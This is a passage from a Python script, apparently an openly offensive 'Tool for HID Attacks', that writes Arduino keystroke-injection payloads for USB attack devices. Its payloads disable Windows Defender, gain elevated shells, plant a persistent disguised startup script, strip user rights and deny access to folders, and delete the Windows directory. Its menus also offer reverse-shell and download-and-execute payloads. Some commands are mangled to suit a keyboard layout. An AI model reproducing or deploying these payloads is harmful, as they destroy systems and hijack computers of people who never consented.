        f = open("kb04rd_payloads/" + payload3, "a")
        f.write(payload_3)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_4(payload4):
    payload_4 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
char shift= KEY_LEFT_SHIFT;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
    dn();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    dw();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
      pe();
      }
  
}
//////////////////////////////////////

void dn() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("cmd");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(1000);

  Keyboard.print("cd %USEPROFILE% ^^ cd Documents");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("erase &Q WindowsDefender.bat");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("copy con WindowsDefender.bat");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("ipconfig &release");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.press(ctrl);
  Keyboard.press('z');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("erase &Q invis.vbs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("copy con invis.vbs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
 
  Keyboard.print("CreateObject*");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print("Wscript.Shell");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print("(.Run ");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print(" ^ WScript.Arguments*0( ^ ");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print(", 0, False");
  
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.press(ctrl);
  Keyboard.press('z');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("wscript.exe invis.vbs WindowsDefender.bat");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.end();
}

void dw() {
  Keyboard.begin();
  delay(5000);

  Keyboard.print("Set/MpPreference /DisableRealtimeMonitoring $true");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(1000);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
 
  Keyboard.end();
}

void pe() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("powershell Start/Process powershell /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.end();
  }""")
    try:
        f = open("kb04rd_payloads/" + payload4, "a")
        f.write(payload_4)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_5(payload5):
    payload_5 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
char shift= KEY_LEFT_SHIFT;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
    pf();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    pe();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
      dr();
      }
  
}
//////////////////////////////////////

void pf() {
  Keyboard.begin();
  delay(5000);

  Keyboard.print("cd %ProgramData%");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("cd Microsoft ");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd Windows");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd Start Menu");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd Programs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd Startup");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("erase &Q WindowsDefender.vbs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("copy con WindowsDefender.vbs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("do");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("CreateObject*");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print("Wscript.Shell");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print("(.Run ");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print("cmd");
  Keyboard.press(shift);
  Keyboard.press('2');
  Keyboard.releaseAll();
  Keyboard.print(", 0, False");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("loop");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.press(ctrl);
  Keyboard.press('z');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("start WindowsDefender.vbs && exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.end();
}

void pe() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
 
  Keyboard.end();
}

void dr() {
  Keyboard.begin();
  delay(5000);

  Keyboard,print("net localgroup Administradores %USERNAME% &delete");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd.. ");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cacls Users &D %USERNAME% ^^ cacls Windows &D %USERNAME%");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("S");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("S");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd %USEPROFILE%");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("cacls Desktop &D %USERNAME% ^^ cacls Documents &D %USERNAME% ^^ cacls Pictures &D %USERNAME% ^^ cacls Videos &D %USERNAME%");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("S");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("S");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("S");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("S");  
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.end();
  }""")
    try:
        f = open("kb04rd_payloads/" + payload5, "a")
        f.write(payload_5)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_6(payload6):
    payload_6 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
char shift= KEY_LEFT_SHIFT;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
  pe();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    sb();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
        }
  
}
//////////////////////////////////////

void pe() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
 
  Keyboard.end();
}

void sb() {
  Keyboard.begin();
  delay(5000);

  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("rmdir &S &Q Windows");
  Keyboard.print("cd..");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(6000);

  Keyboard.press(ctrl);
  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.end();
  }""")
    try:
        f = open("kb04rd_payloads/" + payload6, "a")
        f.write(payload_6)
        f.close()
    except:
        print("¡¡¡Error!!!")

while(True):

    banner1= ("""\033[1;31m
    Tool for HID Attacks
    __  _________
   /  |/  / ____/
  / /|_/ / / __  
 / /  / / /_/ /  
/_/  /_/\____/   
                                             
    Made by HiddenShot
    \033[1;31m""")

    subprocess.call('clear', shell=True)
    print(banner1)


    print("""Choose your platform:
    1- Rubber Ducky
    2- Arduino
    3- DigiSpark
    4- Kb04rd (by Kc0rp)
    5- Exit
    
    \033[1;35m
    When you have chosen the option look for your payload 
    in the payloads folder and change the parameters inside it. 
    
    \033[1;35m
    \033[1;32m
    Rubber Ducky: 
    Use the hak5 tool to generate the. bin file:
    #java -jar duckencode.jar -i script.txt -o inject.bin 
    or
    #java -jar duckencode.jar -i script.txt -o inject.bin -l mylayout
    
    \033[1;32m
    \033[1;33m
    This tool uses the hak5 tool to create the .bin file, 
    it is also necessary to use the Arduino IDE to load the Arduino, 
    DigiSpark and Kb04rd payloads.
    
    \033[1;33m
    \033[1;34m
    Payloads only work with Latin American Spanish keyboards.
    \033[1;34m
    """)
    op1= input("\033[1;31mMG> \033[1;31m")
    if op1 == '1':
        while(True):
            subprocess.call('clear', shell=True)
            print("""\033[1;34mMG have this payloads for Rubber Ducky:
        1- Fork Bomb
        2- Quick Fork Bomb
        3- Reverse Shell (netcat)
        4- Download and execute file
        5- Deny Net Access
        6- Disable Windows Defender
        7- Return\033[1;34m""")

            op1_2= input("Rubber_Ducky> ")
            if op1_2 == '1':
                payload_rb_fork1("payload_rd_fork_bomb.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '2':
                payload_rb_fork2("payload_rd_fork_bomb.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '3':
                payload_rb_rs("payload_rd_reverse_shell.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '4':
                payload_rb_download_ex("payload_rd_download_and_execute_file.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '5':
                payload_rb_deny_na("payload_rd_deny_net_access.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '6':
                payload_rb_dis_windef("payload_rb_disable_windows_defender.txt")
                print("Your payload is ready, look it up in: USB-Rubber-Ducky")

            elif op1_2 == '7':
                break
            else:
                print("Select a correct option")


    elif op1 == '2':
        while(True):
            subprocess.call('clear', shell=True)
            print("""\033[1;35mMG have this payloads for Arduino:
        1- Privilege Escalation (cmd)
        2- Privilege Escalation (powershell)
        3- Quik ForkBomb
        4- Delete Any User
        5- Add User
        6- Disable Firewall
        7- Return\033[1;35m""")

            op1_3= input("Arduino> ")
            if op1_3 == '1':
                payload_ar_pec("payload_ar_pec.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '2':
                payload_ar_pep("payload_ar_pep.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '3':
                payload_ar_qf("payload_ar_qf.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '4':
                payload_ar_du("payload_ar_du.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '5':
                payload_ar_au("payload_ar_au.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '6':
                payload_ar_df("payload_ar_df.ino")
                print("Your payload is ready, look it up in: arduino_payloads")

            elif op1_3 == '7':
                break

            else:
                print("Select a correct option")


    elif op1 == '3':
        while(True):
            subprocess.call('clear', shell=True)
            print("""\033[1;32mMG have this payloads for DigiSpark:
        1- Privilege Escalation (cmd)
        2- Privilege Escalation (powershell)
        3- Quik ForkBomb
        4- Disable Firewall
        5- Persistence ForkBomb
        6- Return\033[1;32m""")

            op1_4= input("DigiSpark> ")
            if op1_4 == '1':
                payload_ds_pec("payload_ds_pec.ino")
                print("Your payload is ready, look it up in: digispark_payloads")

            elif op1_4 == '2':
                payload_ds_pep("payload_ds_pep.ino")
                print("Your payload is ready, look it up in: digispark_payloads")

            elif op1_4 == '3':
                payload_ds_qf("payload_ds_qf.ino")
                print("Your payload is ready, look it up in: digispark_payloads")

            elif op1_4 == '4':
                payload_ds_df("payload_ds_df.ino")
                print("Your payload is ready, look it up in: digispark_payloads")

            elif op1_4 == '5':
                payload_ds_pf("payload_ds_pf.ino")
                print("Your payload is ready, look it up in: digispark_payloads")

            elif op1_4 == '6':
                break

            else:
                print("Select a correct option")


    elif op1 == '4':
        while (True):
            subprocess.call('clear', shell=True)
            print("""\033[1;93mChoose your Kb04rd:
        1- Ktr1
        2- Return\033[1;33m""")
            op1_5 = input("Kb04rd> ")
            if op1_5 == '1':
                while(True):
                    print("""MG have this payloads for Ktr1:
        1- Privilege Escalation (cmd) + Disable Firewall + Quik ForkBomb
        2- Privilege Escalation (cmd) + Delete Any User + Add User
        3- For Do Start + Download and execute file (only with english keyboard) + Privilege Escalation (powershell)
        4- Deny Net Access + Disable Windows Defender + Privilege Escalation (powershell)
        5- Persistence ForkBomb +  Privilege Escalation (cmd) + Deny Access To Directory
        6- Privilege Escalation (cmd) + System Broken
        7- Return""")
                    op2_1= input("ktr1>")
                    if op2_1 == '1':
                        payload_1("payload_1.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '2':
                        payload_2("payload_2.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '3':
                        payload_3("payload_3.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '4':
                        payload_4("payload_4.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '5':
                        payload_5("payload_5.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '6':
                        payload_6("payload_6.ino")
                        print("Your payload is ready, look it up in: kb04rd_payloads")

                    elif op2_1 == '7':
                        break

                    else:
                        print("Select a correct option")

            elif op1_5 == '2':
                break
            else:
                print("Select a correct option")


    elif op1 == '5':
        print("Bye ;*")
        break


    else:
        print("Select a correct option")
